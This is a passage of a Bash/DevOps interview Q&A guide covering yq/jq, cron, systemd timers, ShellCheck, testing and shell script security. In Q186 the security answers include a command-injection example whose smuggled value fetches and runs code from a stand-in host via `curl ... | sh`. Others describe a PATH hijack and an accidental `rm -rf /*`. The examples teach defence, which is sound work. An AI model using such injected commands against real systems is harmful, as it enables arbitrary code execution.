export IMAGE="ghcr.io/shack/api:1.4.2"
yq -i '(.spec.template.spec.containers[] | select(.name == "api")).image = strenv(IMAGE)' deploy.yaml

# multi-document file: only Deployments
yq -i '(select(.kind == "Deployment") | .spec.replicas) = 3' all.yaml

# read a value
replicas=$(yq '.spec.replicas' deploy.yaml)
```

`strenv(VAR)` reads an exported environment variable as a string, avoiding quoting and injection issues. `env(VAR)` parses it as YAML (so `"123"` becomes a number).

</details>

### Q159. How do you convert between YAML and JSON in a script? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
yq -o=json '.' values.yaml > values.json        # YAML -> JSON (mikefarah yq v4)
yq -P '.' config.json > config.yaml             # JSON -> pretty YAML
kubectl get deploy api -o json | jq '.spec' | yq -P
```

JSON is valid YAML 1.2, so many tools accept it directly. Converting to JSON lets you reuse `jq` filters you already have.

</details>

### Q160. How do you validate JSON and YAML files in a CI step? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
for f in config/*.json; do jq empty "$f" || { echo "invalid JSON: $f" >&2; exit 1; }; done
for f in k8s/*.yaml; do yq 'true' "$f" >/dev/null || { echo "invalid YAML: $f" >&2; exit 1; }; done
yamllint -s k8s/                   # style plus syntax, strict mode
kubeconform -strict k8s/           # validate against Kubernetes schemas
```

`jq empty` parses and prints nothing, failing with a `parse error` message on bad input.

</details>

### Q161. What does `jq -s`, `jq -n` and `jq -c` do? 🟡

<details>
<summary><b>Answer</b></summary>

- `-s` (slurp): read all input values into one array, e.g. combine many JSON lines.
- `-n` (null input): do not read input; build JSON from `--arg` values.
- `-c` (compact): one line per output value, ideal for JSON Lines logs.

```bash
cat events/*.json | jq -s 'map(select(.level == "error")) | length'
jq -n --arg host "$(hostname)" --argjson pct 93 '{host: $host, disk_pct: $pct}'
jq -c '.items[]' pods.json | while IFS= read -r pod; do jq -r .metadata.name <<<"$pod"; done
```

</details>

### Q162. How do you read structured log lines (JSON Lines) and filter by fields? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
# errors from the payments service in the last file, with timestamp and message
jq -r 'select(.level == "error" and .service == "payments") | "\(.ts) \(.msg)"' app.jsonl

# tolerate non-JSON lines mixed in
jq -R -r 'fromjson? | select(.status >= 500) | .path' app.log | sort | uniq -c | sort -rn
```

`-R` reads raw lines, `fromjson?` parses each and silently skips lines that are not valid JSON.

</details>

---

## cron and systemd timers

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q163. Explain the five cron time fields with examples. 🟢

<details>
<summary><b>Answer</b></summary>

```text
┌ minute (0-59)
│ ┌ hour (0-23)
│ │ ┌ day of month (1-31)
│ │ │ ┌ month (1-12)
│ │ │ │ ┌ day of week (0-7, 0 and 7 = Sunday)
* * * * * command
```

```text
*/5 * * * *     every 5 minutes
30 2 * * *      02:30 every day
0 9 * * 1-5     09:00 on weekdays
0 0 1 * *       midnight on the 1st of each month
15 */6 * * *    at minute 15 every 6 hours
@reboot         once at startup (Vixie/cronie)
```

Gotcha: if both day-of-month and day-of-week are restricted, cron runs when **either** matches (`0 0 1 * 1` = the 1st and every Monday).

</details>

### Q164. What is different about the environment a cron job runs in? 🟢

<details>
<summary><b>Answer</b></summary>

- Shell is `/bin/sh` (dash on Debian/Ubuntu), not Bash, unless `SHELL=` is set.
- `PATH` is minimal, typically `/usr/bin:/bin`.
- No `.bashrc` or `.profile`, no aliases, no `nvm`/`pyenv` setup.
- Working directory is the user's home.
- No terminal; output is mailed to `MAILTO` (or lost if no MTA).
- `%` is converted to a newline unless escaped as `\%`.

```text
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin
MAILTO=ops@example.com
0 3 * * * /opt/scripts/backup.sh >> /var/log/backup.log 2>&1
```

</details>

### Q165. What is the difference between a user crontab, `/etc/crontab`, `/etc/cron.d/` and `/etc/cron.daily/`? 🟡

<details>
<summary><b>Answer</b></summary>

- **User crontab** (`crontab -e`, stored in `/var/spool/cron/`): five time fields + command, runs as that user.
- **`/etc/crontab` and `/etc/cron.d/*`**: system files with an extra **user** field between the time and the command. Files in `cron.d` are what packages and config management should drop.
- **`/etc/cron.{hourly,daily,weekly,monthly}/`**: executable scripts run by `run-parts` (via anacron on many distros). On Debian, `run-parts` ignores filenames containing dots, so `backup.sh` silently never runs; name it `backup`.

```text
# /etc/cron.d/opskit
*/5 * * * * opskit /opt/opskit/bin/opskit-health -q
```

</details>

### Q166. How do you prevent overlapping cron runs and capture output properly? 🟡

<details>
<summary><b>Answer</b></summary>

```text
*/5 * * * * flock -n /run/lock/sync.lock /opt/scripts/sync.sh >> /var/log/sync.log 2>&1
```

- `flock -n` skips the run if the previous one still holds the lock.
- `>> file 2>&1` keeps both streams; better still, log through `logger -t sync` so output lands in syslog/journald.
- Add `timeout 4m` if a hung run should be killed before the next slot.

Without a lock, a job that occasionally runs longer than its interval piles up copies and can exhaust memory or corrupt data.

</details>

### Q167. What is a systemd timer and how does it compare to cron? 🟡

<details>
<summary><b>Answer</b></summary>

A timer unit (`name.timer`) activates a service unit (`name.service`) on a schedule. Advantages over cron:

- Logs go to the journal: `journalctl -u name.service`.
- `systemctl list-timers` shows last and next run.
- `Persistent=true` runs missed jobs after downtime (like anacron).
- `RandomizedDelaySec=` spreads load across a fleet.
- The service never overlaps itself; it is not started again while running.
- Full sandboxing and resource control (`User=`, `ProtectSystem=`, `MemoryMax=`, `CPUQuota=`).
- `OnFailure=` hooks for alerting, and dependencies (`After=network-online.target`).

Cron is simpler and universal; timers are the better default on systemd hosts.

</details>

### Q168. Write a minimal systemd service and timer that run a backup at 02:30 daily. 🟡

<details>
<summary><b>Answer</b></summary>

```ini
# /etc/systemd/system/backup.service
[Unit]
Description=Nightly backup
Wants=network-online.target
After=network-online.target

[Service]
Type=oneshot
ExecStart=/opt/scripts/backup.sh
```

```ini
# /etc/systemd/system/backup.timer
[Unit]
Description=Run backup.service daily at 02:30

[Timer]
OnCalendar=*-*-* 02:30:00
Persistent=true
RandomizedDelaySec=10min

[Install]
WantedBy=timers.target
```

```bash
systemctl daemon-reload
systemctl enable --now backup.timer
systemctl list-timers backup.timer
```

Enable the **timer**, not the service. Use `systemctl start backup.service` to test a run immediately.

</details>

### Q169. What is the difference between `OnCalendar=`, `OnBootSec=` and `OnUnitActiveSec=`? 🔴

<details>
<summary><b>Answer</b></summary>

- `OnCalendar=` is wall-clock time (realtime timer): `daily`, `Mon..Fri 09:00`, `*-*-01 00:00:00`, `*:0/15` (every 15 minutes).
- `OnBootSec=` is time since boot (monotonic).
- `OnUnitActiveSec=` is time since the service was last **activated**; `OnUnitInactiveSec=` since it last finished.

```ini
[Timer]
OnBootSec=2min
OnUnitActiveSec=5min      # every 5 minutes after the first run
```

Monotonic timers need a starting point: `OnUnitActiveSec=` alone never fires if the service has never run, which is why it is paired with `OnBootSec=` (or `OnActiveSec=`).

</details>

### Q170. How do you validate a calendar expression and test a timer without waiting? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
systemd-analyze calendar 'Mon..Fri *-*-* 09:00:00'     # normalized form and next elapse
systemd-analyze calendar --iterations=5 '*:0/15'
systemd-analyze verify /etc/systemd/system/backup.{service,timer}
systemctl start backup.service                          # run now
journalctl -u backup.service -n 50 --no-pager           # see output
systemctl list-timers --all
```

`systemd-analyze calendar` catches typos like `*-*-* 2:30` vs `02:30` interpretation, and shows the timezone used.

</details>

### Q171. What does `Persistent=true` do, and when would you not want it? 🔴

<details>
<summary><b>Answer</b></summary>

With `Persistent=true` on an `OnCalendar=` timer, systemd records the last trigger time on disk; if the machine was off when the timer should have fired, the service runs immediately at the next boot. Ideal for backups and log cleanup on servers that may be stopped (dev boxes, spot instances).

Avoid it when a late run is harmful: a job that sends a "daily report at 09:00" email, or a maintenance task that must only run inside a change window. Note that every timer on a fleet catching up at once after a mass reboot can spike load; combine with `RandomizedDelaySec=`.

</details>

### Q172. What do `Type=oneshot`, `RemainAfterExit=` and `SuccessExitStatus=` mean for script services? 🔴

<details>
<summary><b>Answer</b></summary>

- `Type=oneshot`: systemd waits for the script to exit; the unit is "activating" while it runs. Right for timer-driven jobs.
- `RemainAfterExit=yes`: the unit stays "active" after the script exits; used for one-time setup units (mount, firewall rules), **not** for timer jobs (a remaining-active unit would not be started again).
- `SuccessExitStatus=1 2`: treat these exit codes as success. Useful when a health script uses 1 for "warning" and you do not want the unit marked failed.

```ini
[Service]
Type=oneshot
ExecStart=/opt/opskit/bin/opskit-health -q
SuccessExitStatus=1
TimeoutStartSec=2min
```

</details>

### Q173. How do you run a user-level timer, and why does it stop when you log out? 🔴

<details>
<summary><b>Answer</b></summary>

Put units in `~/.config/systemd/user/` and manage them with `systemctl --user`. The user's systemd instance only runs while the user has a session, so timers stop at logout and do not start at boot, unless lingering is enabled:

```bash
systemctl --user daemon-reload
systemctl --user enable --now report.timer
sudo loginctl enable-linger "$USER"
journalctl --user -u report.service
```

For production server jobs, prefer system units with `User=svc-account`.

</details>

### Q174. How do you alert when a timer-driven service fails? 🟡

<details>
<summary><b>Answer</b></summary>

Use `OnFailure=` to start a notification unit, passing the failed unit's name with a template:

```ini
# backup.service
[Unit]
OnFailure=notify-failure@%n.service

# notify-failure@.service
[Service]
Type=oneshot
ExecStart=/opt/opskit/bin/opskit-alert -s critical -t "unit %i failed" "check: journalctl -u %i"
```

Also monitor from outside: a "dead man's switch" (the job pings a heartbeat URL on success, and the monitoring system alerts when pings stop) catches the case where the timer was disabled or the host is down.

</details>

### Q175. How do you sandbox a script that runs as a systemd service? 🔴

<details>
<summary><b>Answer</b></summary>

```ini
[Service]
User=opskit
Group=opskit
NoNewPrivileges=yes
ProtectSystem=strict          # whole filesystem read-only...
ReadWritePaths=/var/lib/opskit /var/log/opskit   # ...except these
ProtectHome=read-only
PrivateTmp=yes                # private /tmp, defeats /tmp races
PrivateDevices=yes
CapabilityBoundingSet=
MemoryMax=256M
CPUQuota=20%
```

`systemd-analyze security name.service` scores the unit's exposure. Sandboxing turns a compromised or buggy script from "root on the box" into "can write two directories".

</details>

### Q176. How do you handle time zones in cron and systemd timers? 🟡

<details>
<summary><b>Answer</b></summary>

Classic cron uses the system time zone (`timedatectl`); cronie supports `CRON_TZ=` per crontab. systemd `OnCalendar=` uses the system time zone unless you append one: `OnCalendar=*-*-* 02:30:00 UTC` or `Asia/Kolkata`.

Servers should run in UTC so logs, cron and incident timelines line up, and DST changes do not skip or double-run a 02:30 job. Express business-hour schedules explicitly with a time zone suffix.

</details>

---

## ShellCheck, debugging, testing, portability and security

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q177. What is ShellCheck and how do you use it in a team? 🟢

<details>
<summary><b>Answer</b></summary>

ShellCheck is a static analyzer for shell scripts that catches quoting bugs, unchecked `cd`, unused variables, portability problems and dozens of subtle errors, each with a code (`SC2086`) and a wiki page.

```bash
shellcheck -x deploy.sh lib/*.sh           # -x follows `source`d files
shellcheck -s sh entrypoint.sh             # check as POSIX sh
shellcheck -S warning scripts/*.sh         # minimum severity
shellcheck -f gcc scripts/*.sh             # editor/CI friendly format
```

We run it in pre-commit and CI with zero findings allowed, and in editors via the VS Code extension.

</details>

### Q178. How do you disable a ShellCheck warning, and when is that acceptable? 🟡

<details>
<summary><b>Answer</b></summary>

Disable it on the next line, with a reason, only when the code is intentionally doing what the warning describes:

```bash
# shellcheck disable=SC2086  # $OPTS is intentionally split into multiple flags
rsync $OPTS src/ dst/
```

Project-wide settings go in `.shellcheckrc` (`disable=SC1091`, `source-path=SCRIPTDIR`, `external-sources=true`). Disabling SC2086 globally to silence noise defeats the main reason to use ShellCheck. Often the better fix is an array: `opts=(-a --delete); rsync "${opts[@]}" src/ dst/`.

</details>

### Q179. Name the ShellCheck warnings you see most and what each means. 🟡

<details>
<summary><b>Answer</b></summary>

| Code | Meaning |
|---|---|
| SC2086 | Double quote to prevent globbing and word splitting |
| SC2046 | Quote this to prevent word splitting (unquoted `$(...)`) |
| SC2155 | Declare and assign separately to avoid masking return values |
| SC2164 | Use `cd ... \|\| exit` in case cd fails |
| SC2034 | Variable appears unused |
| SC2181 | Check exit code directly with `if mycmd;`, not `$?` |
| SC2068 | Double quote array expansions to avoid re-splitting elements |
| SC2207 | Prefer `mapfile` or `read -a` to split command output |
| SC1091 | Not following a sourced file (use `-x` or a `source=` directive) |
| SC2016 | Expressions don't expand in single quotes |

</details>

### Q180. How do you debug a Bash script? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
bash -n script.sh            # syntax check only, nothing runs
bash -x script.sh            # trace every command after expansion
set -x; risky_part; set +x   # trace just one section
bash -v script.sh            # print lines as read (before expansion)
```

Read the `+` lines: they show the command **after** expansion, so you see exactly what an unquoted variable turned into. Combine with `PS4` for file and line numbers, and with `trap ... ERR` for the failing line.

</details>

### Q181. How do you make `set -x` output more useful with `PS4`? 🟡

<details>
<summary><b>Answer</b></summary>

`PS4` is the prefix printed before each traced command (default `+ `). It is expanded every time, so it can include the location:

```bash
export PS4='+ ${BASH_SOURCE##*/}:${LINENO}:${FUNCNAME[0]:-main}: '
bash -x ./deploy.sh
# + deploy.sh:42:rollout: kubectl rollout status deploy/api --timeout=120s
```

Use single quotes so the variables expand at trace time. Add `$(date +%T)` to spot slow steps, at the cost of a fork per command.

</details>

### Q182. What is bats, and how do you test a script that calls external commands? 🟡

<details>
<summary><b>Answer</b></summary>

bats (Bash Automated Testing System, `bats-core`) runs `@test` blocks; `run cmd` captures `$status` and `$output`.

```bash
@test "alert fails with exit 2 on missing title" {
  run ./bin/opskit-alert -s critical
  [ "$status" -eq 2 ]
  [[ "$output" == *"-t TITLE is required"* ]]
}
```

To isolate external commands (`curl`, `aws`, `systemctl`), put stub scripts in a directory that comes first on `PATH` during tests; stubs record their arguments and return canned output. Each test gets `$BATS_TEST_TMPDIR` for files. The [hands-on lab](./hands-on-lab.md) uses exactly this pattern.

</details>

### Q183. What is `shfmt` and why use it alongside ShellCheck? 🟢

<details>
<summary><b>Answer</b></summary>

`shfmt` formats shell code consistently (indentation, spacing, `case` layout), like `gofmt` for shell. ShellCheck finds bugs; `shfmt` ends style debates in code review.

```bash
shfmt -d -i 2 -ci scripts/     # show diff: 2-space indent, indent case branches
shfmt -w -i 2 -ci scripts/     # rewrite in place
```

Run it in CI with `-d` so unformatted code fails the build.

</details>

### Q184. What are common "bashisms" that break under `/bin/sh`? 🟡

<details>
<summary><b>Answer</b></summary>

| Bash | POSIX sh alternative |
|---|---|
| `[[ $a == b* ]]` | `case $a in b*) ... ;; esac` |
| `arr=(a b)` | positional params `set -- a b` or newline-separated strings |
| `function f { }` | `f() { }` |
| `$'\n'` | `"$(printf '\n_')"` then strip the `_` |
| `<(cmd)` | temp file or named pipe |
| `${var//a/b}`, `${var^^}` | `sed`, `tr` |
| `source f` | `. f` |
| `&>file` | `>file 2>&1` |
| `echo -e` | `printf` |
| `(( i++ ))` | `i=$((i + 1))` |

Check with `shellcheck -s sh` or `checkbashisms`. Typical error under dash: `[[: not found` or `Syntax error: "(" unexpected`.

</details>

### Q185. When must a script be POSIX `sh` rather than Bash? 🟢

<details>
<summary><b>Answer</b></summary>

When Bash may not exist: Alpine and BusyBox-based images (only `ash`), distroless images with a shell, initramfs, embedded devices, Docker `HEALTHCHECK` or entrypoints in minimal images, and `/bin/sh -c` contexts you do not control (Makefiles by default, some CI runners, `system()` calls). Everywhere else, we use Bash explicitly and get arrays and `[[ ]]`.

</details>

### Q186. What is command injection in shell scripts, and how do you prevent it? 🔴

<details>
<summary><b>Answer</b></summary>

Injection happens when untrusted data is interpreted as code: by `eval`, `bash -c "$string"`, `ssh host "cmd $var"`, `sh -c` in `find -exec`, or unquoted expansions that turn into options.

```bash
branch="main; curl evil.sh | sh"
eval "git checkout $branch"                  # runs the curl
ssh web1 "cd /srv && git checkout $branch"   # same problem remotely

# Safe
[[ $branch =~ ^[A-Za-z0-9._/-]+$ ]] || die "invalid branch name"
git checkout -- "$branch"
ssh web1 "cd /srv && git checkout -- $(printf '%q' "$branch")"
```

Rules: validate input against an allow-list, never `eval` user data, pass data as arguments not code, use `--` to end options, and use `printf '%q'` when you must build a command string for a remote shell.

</details>

### Q187. Why is passing secrets as command-line arguments a problem? 🔴

<details>
<summary><b>Answer</b></summary>

Any local user can read every process's arguments via `ps aux` or `/proc/PID/cmdline` while it runs, and they end up in shell history, `set -x` traces and audit logs.

```bash
mysql -u app -p"$DB_PASS" ...           # visible in ps
MYSQL_PWD="$DB_PASS" mysql -u app ...   # env: readable only by the same user/root
curl -K <(printf 'header = "Authorization: Bearer %s"\n' "$TOKEN") "$url"
docker login -u ci --password-stdin <<<"$REGISTRY_TOKEN"
```

Prefer stdin (`--password-stdin`), config files with mode 0600, or file descriptors via process substitution.

</details>

### Q188. What are the security rules for scripts that run as root? 🔴

<details>
<summary><b>Answer</b></summary>

1. Code and config owned by root and not writable by others (`install -m 0755 -o root`), or anyone can escalate.
2. Set a known `PATH` at the top; do not trust the caller's environment (`PATH`, `IFS`, `LD_PRELOAD`, `BASH_ENV`).
3. Temp files only via `mktemp`; never predictable names in `/tmp`.
4. Never follow user-controlled symlinks: `chown -h`, `find -P`, check with `[[ -L ]]`.
5. Validate every input; use `--` before filenames.
6. Drop privileges for the parts that do not need root (`runuser -u app -- cmd`, `setpriv`).
7. In `sudoers`, allow the exact script path with no wildcards in arguments, never an editor or a shell.

</details>

### Q189. Why is `rm -rf "$DIR/"*` dangerous, and how do you guard deletions? 🟡

<details>
<summary><b>Answer</b></summary>

If `DIR` is unset or empty (a typo, a failed command), the line becomes `rm -rf /*`. The famous Steam-for-Linux bug did exactly this with `rm -rf "$STEAMROOT/"*`.

```bash
set -u
rm -rf -- "${DIR:?DIR is empty}/"*
[[ $DIR == /srv/app/releases/* ]] || die "refusing to delete outside releases: $DIR"
```

Guard with `${VAR:?}`, check the path against an expected prefix, and prefer `find "$DIR" -mindepth 1 -delete` with a validated `DIR`.

</details>

### Q190. How do you check a downloaded script or binary before running it? 🟡

<details>
<summary><b>Answer</b></summary>

Avoid `curl ... | bash` for anything you do not fully control: a truncated download can execute a partial script, and there is no verification.

```bash
curl -fsSLo install.sh https://example.com/install.sh
curl -fsSLo install.sh.sha256 https://example.com/install.sh.sha256
sha256sum -c install.sh.sha256 || die "checksum mismatch"
less install.sh                 # read it
bash install.sh
```

For binaries in CI, pin a version and its SHA-256 in the script, and verify GPG or cosign signatures where the project publishes them.

</details>

### Q191. What is the `IFS`/`PATH` hijack risk for setuid-like or sudo scripts, and how do you defend? 🔴

<details>
<summary><b>Answer</b></summary>

If a privileged script inherits the caller's environment, an attacker can set `PATH=/tmp/evil:$PATH` so `ls` or `tar` resolves to their binary, or set `BASH_ENV` so Bash sources their file on start. Linux ignores setuid on scripts, but `sudo` rules and root cron jobs that call scripts are the real risk.

```bash
#!/usr/bin/env bash
set -Eeuo pipefail
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
unset BASH_ENV ENV CDPATH
IFS=$' \t\n'
umask 027
```

`sudo` with `env_reset` and `secure_path` (the defaults on most distros) mitigates this; do not add `SETENV` or `env_keep` for such scripts. Note that `#!/usr/bin/env bash` itself uses `PATH`, so privileged entry points can use `#!/bin/bash`.

</details>

### Q192. How do you test a script against multiple Bash versions and shells? 🔴

<details>
<summary><b>Answer</b></summary>

Run the test suite in containers with different interpreters:

```bash
for v in 4.4 5.0 5.2; do
  docker run --rm -v "$PWD:/w" -w /w "bash:$v" bash -c 'bash --version | head -1 && ./run-tests.sh'
done
docker run --rm -v "$PWD:/w" -w /w alpine sh -c 'sh ./entrypoint.sh --self-test'
```

The official `bash:<version>` images make it easy to catch features used beyond your minimum version (`wait -n -p` needs 5.1, namerefs 4.3, `${var@Q}` 4.4). Declare the minimum version in the README and check it at runtime: `(( BASH_VERSINFO[0] >= 4 )) || die "need Bash 4+"`.

</details>

---

## Best practices and rapid-fire commands

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q193. What does a production-ready script template look like? 🔴

<details>
<summary><b>Answer</b></summary>

```bash
#!/usr/bin/env bash
# deploy.sh: roll out a release to the web tier. Usage: deploy.sh -e ENV VERSION
set -Eeuo pipefail
shopt -s inherit_errexit nullglob

readonly SCRIPT_NAME=${0##*/}
log()  { printf '%s %s [%s] %s\n' "$(date -u +%FT%TZ)" "$1" "$SCRIPT_NAME" "${*:2}" >&2; }
die()  { log ERROR "$*"; exit 1; }
usage(){ sed -n '2p' "$0" | sed 's/^# //'; }

cleanup() { [[ -n ${tmpdir:-} ]] && rm -rf -- "$tmpdir"; }
trap cleanup EXIT
trap 'log ERROR "line $LINENO: $BASH_COMMAND"' ERR

main() {
  local env=""
  while getopts ':e:h' o; do
    case $o in e) env=$OPTARG ;; h) usage; exit 0 ;; *) usage >&2; exit 2 ;; esac
  done
  shift $((OPTIND - 1))
  [[ $env =~ ^(dev|staging|prod)$ ]] || die "-e must be dev, staging or prod"
  local version=${1:?version required}
  tmpdir=$(mktemp -d)
  log INFO "deploying $version to $env"
}
main "$@"
```

</details>

### Q194. What logging practices do you follow in automation scripts? 🟡

<details>
<summary><b>Answer</b></summary>

- One line per event: UTC ISO 8601 timestamp, level, script name, message (and key=value fields).
- Logs to stderr; data to stdout.
- Under systemd, just write to stdout/stderr; journald adds metadata. Elsewhere, `logger -t myscript -p user.err "msg"` sends to syslog.
- Log start, end, duration and the decision points ("skipped: lock held", "pruned 3 backups").
- Never log secrets; mask tokens (`${token:0:4}****`).
- Rotate any file logs with logrotate.

The goal: at 3 AM, `journalctl -u backup --since today` tells you what happened without reading the code.

</details>

### Q195. How do you make a script support a dry-run mode cleanly? 🟢

<details>
<summary><b>Answer</b></summary>

Wrap every state-changing command in a function that prints instead of executing when dry-run is on:

```bash
DRY_RUN=${DRY_RUN:-0}
run() {
  if (( DRY_RUN )); then
    printf 'DRY RUN:'; printf ' %q' "$@"; printf '\n'
  else
    "$@"
  fi
}
run rm -rf -- "/srv/app/releases/$old"
run systemctl reload nginx
```

`printf %q` shows exactly how the arguments would be passed, including spaces. Read-only commands (queries, `find`) still run so the dry run shows real targets.

</details>

### Q196. Rapid fire: one-liners for disk, memory and process checks. 🟢

<details>
<summary><b>Answer</b></summary>

```bash
df -hP -x tmpfs -x devtmpfs                         # disk usage, no pseudo filesystems
df -iP /                                            # inode usage
du -xh --max-depth=1 /var 2>/dev/null | sort -h      # what is filling /var
free -m; awk '/MemAvailable/ {print $2/1024 " MiB"}' /proc/meminfo
ps -eo pid,user,%mem,%cpu,etime,cmd --sort=-%mem | head
pgrep -af nginx                                     # find processes with full command line
lsof +L1                                            # deleted files still held open
uptime; cat /proc/loadavg; nproc
```

</details>

### Q197. Rapid fire: one-liners for logs and text. 🟢

<details>
<summary><b>Answer</b></summary>

```bash
journalctl -u nginx --since '1 hour ago' -p err --no-pager
tail -F /var/log/app/app.log | grep --line-buffered ERROR
grep -c ' 500 ' access.log
awk '{print $9}' access.log | sort | uniq -c | sort -rn
sed -n '100,120p' app.log
grep -rIl 'TODO' --exclude-dir=.git .
awk 'length > 500' app.log | head                   # suspiciously long lines
zcat app.log.*.gz | grep -F 'timeout' | wc -l
```

`--line-buffered` makes grep flush each line, so piping `tail -F` into it works in real time.

</details>

### Q198. Rapid fire: one-liners for files and housekeeping. 🟢

<details>
<summary><b>Answer</b></summary>

```bash
find /var/log/app -name '*.log' -mtime +14 -delete
find / -xdev -type f -size +1G -exec ls -lh {} + 2>/dev/null
tar -czf "backup-$(date +%F).tar.gz" -C /etc nginx
sha256sum -c SHA256SUMS
rsync -a --delete --dry-run src/ dst/               # preview a mirror
ls -1t /var/backups/*.tar.gz | tail -n +8           # all but the newest 7 (simple names only)
stat -c '%U:%G %a %n' /etc/opskit/opskit.conf
install -d -m 0750 -o app -g app /srv/app/shared
```

</details>

### Q199. Rapid fire: one-liners for JSON, YAML and cloud CLIs. 🟢

<details>
<summary><b>Answer</b></summary>

```bash
kubectl get pods -A -o json | jq -r '.items[] | select(.status.phase!="Running") | "\(.metadata.namespace)/\(.metadata.name)"'
kubectl get deploy -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.replicas}{"\n"}{end}'
aws sts get-caller-identity --query Arn --output text
aws s3 ls "s3://$bucket/servers/$(hostname -s)/" | tail -n 3
yq '.services | keys' compose.yaml
jq -r 'to_entries[] | "\(.key)=\(.value)"' config.json > app.env
curl -fsS https://api.github.com/repos/cli/cli/releases/latest | jq -r .tag_name
```

</details>

### Q200. Rapid fire: what does each of these print or do? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
echo "${#PATH}"                  # length of PATH in characters
echo "${0##*/}"                  # script name without directory
echo "$(( 7 / 2 ))"              # 3 (integer division)
set -- a "b c"; echo $#          # 2
x=; echo "${x:-empty}"           # empty
true | false; echo $?            # 1 (last command)
false | true; echo $?            # 0 (1 with pipefail)
[[ 10 < 9 ]] && echo yes         # yes (string comparison)
printf '%q\n' "it's a test"      # it\'s\ a\ test
type cd                          # cd is a shell builtin
```

Interviewers use questions like these to check you understand expansion and exit-status rules, not just syntax.

</details>

<!-- DEVOPS-SHACK:FOOTER -->
---

<div align="center">

### 🚀 Made with ❤️ by [DevOps Shack](https://www.youtube.com/@devopsshack)

**Learn DevOps, DevSecOps, Cloud and Kubernetes the practical way.**

[▶️ YouTube — DevOps Shack](https://www.youtube.com/@devopsshack) · [▶️ Hindi — @shackverse](https://www.youtube.com/@shackverse) · [🎓 devopsshack.com](https://devopsshack.com) · [📸 Instagram @devopsshack](https://www.instagram.com/devopsshack)

[🏠 Back to Home](../README.md) · [⭐ Star the original repo](https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack)

<sub>© DevOps Shack · Licensed CC BY-NC-SA 4.0 · If you found this copy anywhere other than <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">github.com/jaiswaladi246</a>, the original and latest version is maintained by DevOps Shack.</sub>

</div>
<!-- /DEVOPS-SHACK:FOOTER -->
